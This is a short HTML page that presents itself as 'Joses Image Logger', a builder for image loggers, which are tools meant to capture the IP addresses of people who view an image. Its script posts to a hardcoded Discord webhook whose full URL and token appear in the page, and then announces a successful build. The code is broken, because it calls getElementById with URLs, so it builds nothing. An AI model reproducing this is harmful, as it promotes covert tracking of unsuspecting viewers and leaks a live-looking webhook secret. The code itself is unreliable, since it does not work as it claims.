<!DOCTYPE html>
<html>
<head>
<title> Joses Image Logger</title>
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>
<link rel="shortcut icon" types="x-icon" href="assets/icon.jpg">
<body>
<form>
    <img src ="assets/profile.jpg">
    <div class="joses-text">
        <h1> Joses Image Logger</h1>
    </div>
    <div class ="input-container">
        <i class ="fa fa-key icon"></i>
        <input class ="input-field" type ="text" id="image" placeholder ="Enter Image Url">
       </div>
    <div class ="input-container">
      <i class ="fa fa-user icon"></i>
      <input class ="input-field" type ="text" id="url" placeholder ="Enter Webhook">
</div>
<button type="button" class ="btn" id="create"> Create Image Logger</button>
<script>
    document.getElementById("create").onclick = function(){
    var image = document.getElementById("https://images.kinguin.net/g/carousel-main-mobile/media/images/products/20251029021240556_700f54f8-2b2c-4c9a-809e-b8645a193741.png").value    
    var webhook = document.getElementById("https://discord.com/api/webhooks/1521868460437803103/vo3UgdMEE5x_tJtSUSjlxh0IQ8K7CkSAoq2Y25pCuSPLtuLK3iB86S5GzBKNZle_enTX").value
    var request = new XMLHttpRequest;
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
    username: "Image Logger Builder",
    avatar_url: "https://cdn.discordapp.com/attachments/1076551991553179649/1076583577598316645/icon.jpg",
    content: "Here Is Your Image:" + image}
    request.send(JSON.stringify(params));
    alert("Image Logger Was Built SucessFully")
    location.reload()
} 
</script>
</form>
</body>
</html>
